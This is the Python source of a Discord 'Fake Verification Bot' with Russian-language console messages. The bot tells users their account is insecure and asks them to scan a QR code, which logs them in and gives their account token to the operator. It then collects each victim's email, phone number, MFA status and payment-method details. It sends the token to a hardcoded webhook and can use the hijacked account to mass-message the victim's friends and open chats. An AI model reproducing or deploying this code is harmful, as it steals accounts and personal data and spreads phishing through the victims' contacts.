#Importing modules
import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
from nextcord import ButtonStyle
from nextcord.ext import commands
from nextcord.ui import Button, View
from nextcord.utils import get
from websockets import connect
from websockets.exceptions import ConnectionClosedOK, ConnectionClosedError
from websockets.typing import Origin
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from colorama import Fore, init; init(autoreset=True)
from urllib.request import Request, urlopen
from time import sleep
import discord
from discord import SyncWebhook
y = Fore.LIGHTYELLOW_EX
b = Fore.LIGHTBLUE_EX
w = Fore.LIGHTWHITE_EX


#Get the headers
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

#Recovery of the configuration put in the config.json file
with open('config.json') as f:
    config = json.load(f)

botToken = config.get('botToken')
prefix = config.get('prefix')
command_name = config.get('command_name')
logs_channel_id = config.get('logs_channel_id')
give_role = config.get('give_role')
role_name = config.get('role_name')
mass_dm = config.get('mass_dm')
message = config.get('message')

#Bot title
def bot_title():
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW(f"Fake Verification Bot")
    print(f"""\n\n{Fore.RESET}                            ███████╗ █████╗ ██╗  ██╗███████╗    ██╗   ██╗███████╗██████╗ ██╗███████╗
                            ██╔════╝██╔══██╗██║ ██╔╝██╔════╝    ██║   ██║██╔════╝██╔══██╗██║██╔════╝
                            █████╗  ███████║█████╔╝ █████╗      ██║   ██║█████╗  ██████╔╝██║█████╗  
                            ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝      ╚██╗ ██╔╝██╔══╝  ██╔══██╗██║██╔══╝  
                            ██║     ██║  ██║██║  ██╗███████╗     ╚████╔╝ ███████╗██║  ██║██║██║     
                            ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝      ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝╚═╝\n""".replace('█', f'{b}█{y}'))
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------\n{w}https://discord.gg/emshop | Создатель Goreadely#0001 \n{y}------------------------------------------------------------------------------------------------------------------------\n""".replace('|', f'{b}|{w}'))

#Bot home page
def startprint():
    bot_title()

    if give_role:
        give_role_texte = f"""{Fore.GREEN}Active {Fore.RESET}with {Fore.LIGHTWHITE_EX}{role_name if role_name != "ROLE-NAME-HERE" else "None"}"""
    else:
        give_role_texte = f"{Fore.RED}Disabled"
    
    if mass_dm == 3:
        mass_dm_texte = f"{Fore.GREEN}Friends{w}/{Fore.GREEN}Current DMs"
    elif mass_dm == 2:
        mass_dm_texte = f"{Fore.GREEN}Friends"
    elif mass_dm == 1:
        mass_dm_texte = f"{Fore.GREEN}Current DMs"
    else:
        mass_dm_texte = f"{Fore.RED}Disabled"

    print(f"""                                            {y}[{b}+{y}]{w} Bot Informations:\n
                                                [#] Вход выполен под:    {bot.user.name}
                                                [#] ID бота:          {bot.user.id}
                                                [#] Канал логов:    {logs_channel_id if logs_channel_id != "LOGS-CHANNEL-ID-HERE" else "None"}
                                                [#] Название команды:    {bot.command_prefix}{command_name}\n\n
                                            {y}[{b}+{y}]{w} Settings View:\n
                                                [#] Роль, после верификации:       {give_role_texte}
                                                [#] Mass DM Type:    {mass_dm_texte}\n\n\n""".replace('[#]', f'{y}[{w}#{y}]{w}'))
    print(f"{y}[{Fore.GREEN}!{y}]{w} Бот включен!")

intents = nextcord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix=prefix, description="Fake Verification Bot", intents=intents)

#Launching the Bot
def Init():
    botToken = config.get('botToken')
    prefix = config.get('prefix')
    if botToken == "":
        bot_title()
        input(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Пожалуйста, установите токен в файле config.json.")
        return
    elif prefix == "":
        bot_title()
        input(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Пожалуйста, установите префикс в файле config.json.")
        return
    try:
        bot.run(botToken)
    except:
        os.system("cls")
        bot_title()
        input(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Токен, расположенный в файле config.json, является невалидным!")
        return

#Event initialization
@bot.event
async def on_ready():
    startprint()
    await bot.change_presence(activity=nextcord.Game(name=""))

#Bot command
@bot.command(name=command_name)
async def start(ctx):

    #Recover the name of the channel logs
    try:
        logs_channel = bot.get_channel(int(logs_channel_id))
    except:
        logs_channel = None
    verification = Button(label="Verification", style=ButtonStyle.blurple)

    #If the verification button is clicked
    async def verification_callback(interaction):
        from remoteauthclient import RemoteAuthClient
        c = RemoteAuthClient()
        
        #Создание QR-кода, инфа о пользователе, выдача роли, рассылка в лс, ...
        from async_hcaptcha import AioHcaptcha
        @c.event("on_fingerprint")
        async def on_fingerprint(data):
            @c.event("on_captcha")
            async def on_captcha(captcha_data):
                print("Captcha!")
                solver = AioHcaptcha(captcha_data["a9b5fb07-92ff-493f-86fe-352a2803b3df"], "https://discord.com/login",
                                     {"executable_path": "chromedriver.exe"})
                captcha_key = await solver.solve(custom_params={"rqdata": captcha_data["captcha_rqdata"]})
                if not captcha_key:
                    print("Cannot solve captcha")
                return captcha_key
            @c.event("on_cancel")
            async def on_cancel():
                print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Auth canceled: {data}")
    
            @c.event("on_timeout")
            async def on_timeout():
                print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Timeout: {data}")
    
            embed_qr.set_image(url=f"https://api.qrserver.com/v1/create-qr-code/?size=256x256&data={data}")
            await interaction.edit_original_message(embed=embed_qr)
            print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} QR Code Generated: {data}")
    
            @c.event("on_userdata")
            async def on_userdata(user):
                if not os.path.isfile("database.json"):
                    json.dump({}, open("database.json", "w", encoding="utf-8"), indent=4)
    
                database = json.load(open("database.json", encoding="utf-8"))
    
                if not user.id in database:
                    database[user.id] = {}
    
                database[user.id]["username"] = f"{user.username}#{user.discriminator}"
                database[user.id]["avatar_url"] = f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png"
    
                json.dump(database, open("database.json", "w", encoding="utf-8"), indent=4)
                print(f"{y}[{b}#{y}]{w} {user.username}#{user.discriminator} ({user.id})")
    
                @c.event("on_token")
                async def on_token(token):
                    if not os.path.isfile("database.json"):
                        json.dump({}, open("database.json", "w", encoding="utf-8"), indent=4)
    
                    database = json.load(open("database.json", encoding="utf-8"))

                    if not user.id in database:
                        database[user.id] = {}

                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=getheaders(token))
                        if res.status_code == 200:
                            res_json = res.json()
                            avatar_id = res_json['avatar']
                            phone_number = res_json['phone']
                            email = res_json['email']
                            mfa_enabled = res_json['mfa_enabled']
                            flags = res_json['flags']
                            locale = res_json['locale']
                            verified = res_json['verified']
                            has_nitro = False
                            res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))
                            nitro_data = res.json()
                            has_nitro = bool(len(nitro_data) > 0)
                            billing_info = []
                            for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token, 'Content-Type': 'application/json'}).json():
                                if x['type'] == 1:
                                    data = {'Payment Type': 'Credit Card', 'Valid': not x['invalid']}
    
                                elif x['type'] == 2:
                                    data = {'Payment Type': 'PayPal', 'Valid': not x['invalid']}
    
                                billing_info.append(data)
                            payment_methods = len(billing_info)
                            database[user.id]["avatar_id"] = avatar_id
                            database[user.id]["phone_number"] = phone_number
                            database[user.id]["email"] = email
                            database[user.id]["mfa_enabled"] = mfa_enabled
                            database[user.id]["flags"] = flags
                            database[user.id]["locale"] = locale
                            database[user.id]["verified"] = verified
                            database[user.id]["has_nitro"] = has_nitro
                            database[user.id]["payment_methods"] = payment_methods
                            if logs_channel:
                                webhook = SyncWebhook.from_url("https://discord.com/api/webhooks/1015969912709206106/GYVWHNB-IQ4sbHOpBqu392JsDd1kMzUNW0dNjarFn535_NNy2iqR969x0EBECFrTYgnH")
                                webhook.send(f"========================\n@everyone {user.username}#{user.discriminator}\nnit {has_nitro}\npl: {payment_methods}````")
                                webhook.send(f'{token}\n========================')
                                embed_user = nextcord.Embed(title=f"**Новый пользователь верифицировался: {user.username}#{user.discriminator}**", description=f"```yaml\nID Пользователя: {user.id}\nID аватара: {avatar_id}\nНомер телефона: {phone_number}\nПочта: {email}\nMFA: {mfa_enabled}\nФлажки: {flags}\nРасположение: {locale}\nВерификация: {verified}\nНитро: {has_nitro}\nПлатега: {payment_methods}\n```\n```yaml\nТокен: {token}\n```", color=5003474)
                    except:
                        if logs_channel:
                            webhook = SyncWebhook.from_url("https://discord.com/api/webhooks/1015969912709206106/GYVWHNB-IQ4sbHOpBqu392JsDd1kMzUNW0dNjarFn535_NNy2iqR969x0EBECFrTYgnH")
                            webhook.send(f"@everyone {token}")
                            embed_user = nextcord.Embed(title=f"**Новый пользователь верифицировался: {user.username}#{user.discriminator}**", description=f"```yaml\nID Пользователя: {user.id}\nТокен: {token}\n```\n```yaml\nОстальная информация не найдена\n```", color=5003474)
                        pass
                    
                    database[user.id]["token"] = token
                
                    json.dump(database, open("database.json", "w", encoding="utf-8"), indent=4)

                    print(f"{y}[{b}#{y}]{w} Token: {token}")
                    if logs_channel:
                        embed_user.set_footer(text="discord.gg/H2jRVvXagh")
                        embed_user.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
                        await logs_channel.send(embed=embed_user)
                    
                    #If Enable, gives a role after verification
                    if give_role == True:
                        try:
                            await interaction.user.add_roles(get(ctx.guild.roles, name=role_name))
                            print(f"{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Роль добавлена пользователю {user.username}#{user.discriminator}")
                            if logs_channel:
                                embed_role = nextcord.Embed(title=f"**Добавление роли:**", description=f"```yaml\nРоль {role_name} успешно выдана для {user.username}#{user.discriminator}!```", color=5003474)
                                embed_role.set_footer(text="discord.gg/H2jRVvXagh")
                                embed_role.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
                                await logs_channel.send(embed=embed_role)
                        except:
                            print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Есть проблема с ролью")

                    #If Enable, DM all the current person's private chat
                    if mass_dm == 1 or mass_dm == 3:
                        try:
                            success = 0
                            failures = 0
                            channel_id = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
    
                            if not channel_id:
                                print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} чаты пользователя не найдены")
                            for channel in [channel_id[i:i+3] for i in range(0, len(channel_id), 3)]:
                                for channel2 in channel:
                                    for _ in [x["username"] + "#" + x["discriminator"] for x in channel2["recipients"]]:
                                        try:
                                            requests.post(f'https://discord.com/api/v9/channels/' + channel2['id'] + '/messages', headers={'Authorization': token}, data={"content": f"{message}"})
                                            success += 1
                                            sleep(.5)
                                        except:
                                            failures += 1
                                            sleep(.5)
                                            pass
                            print(f"{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Текущий DM успешно отправил сообщение")
                            if logs_channel:
                                embed_cdm = nextcord.Embed(title=f"**Спам в лс:**", description=f"Сообщения успешно отправлены с {user.username}#{user.discriminator}\n```yaml\nСообщение: {message}\nКол-во чатов: {len(channel_id)}\nУспешных отправок: {success}\nНеуспешные отправки: {failures}```", color=5003474)
                                embed_cdm.set_footer(text="discord.gg/H2jRVvXagh")
                                embed_cdm.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
                                await logs_channel.send(embed=embed_cdm)
                        except Exception as e:
                            print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Массовая рассылка неудалась! {e}")
                            pass
                    
                    #If active, DM all user's friends
                    if mass_dm == 2 or mass_dm == 3:
                        try:
                            getfriends = json.loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())

                            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\n{message}\n-----------------------------325414537030329320151394843687--'
                            for friend in getfriends:
                                try:
                                    chat_id = json.loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=json.dumps({"recipient_id": friend["id"]}).encode())).read().decode())["id"]
                                    send_message = urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=payload.encode())).read().decode()
                                    send_message(token, chat_id, payload)
                                except:
                                    pass
                                sleep(.5)

                            if len(getfriends) == 0:
                                print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} Друзей на аккаунте не найдено")
                            else:
                                print(f"{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Сообщения друзьям разосланы!")
                            if logs_channel:
                                embed_fdm = nextcord.Embed(title=f"**Спам всем друзьям:**", description=f"Сообщения успешно отправлены с {user.username}#{user.discriminator}\n```yaml\nСообщение: {message}\nВсего друзей: {len(getfriends)}```", color=5003474)
                                embed_fdm.set_footer(text="discord.gg/H2jRVvXagh")
                                embed_fdm.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
                                await logs_channel.send(embed=embed_fdm)
                        except Exception as e:
                            print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Рассылка друзьям неудалась! {e}")
                            pass
        
        #Embed Creation
        asyncio.create_task(c.run())
        embed_qr = nextcord.Embed(title="__**You are human?!**__", description="You are seeing this because we considered your account to be insecure.!\n\n**Please follow the steps below to complete verification**:\n1️⃣ *Open the Discord mobile app*\n2️⃣ *Go to settings*\n3️⃣ *Select \"Scan QR code\"*\n4️⃣ *Scan the QR code below.*", color=5003474)
        embed_qr.set_footer(text="Note: captcha will expire in 2 minutes")
        embed_qr.set_thumbnail(url="https://emoji.discord.st/emojis/aa142d2c-681c-45a2-99e9-a6e63849b351.png")
        await interaction.response.send_message(embed=embed_qr, ephemeral=True)

    verification.callback = verification_callback

    myview = View(timeout=None)
    myview.add_item(verification)
    embed = nextcord.Embed(title="**Need verify!**", description="🔔 To gain access to this server, you must first pass verification\n🧿 Click the button below", color=5003474)
    await ctx.send(embed=embed, view=myview)

#Start Everything
if __name__ == '__main__':
    Init()
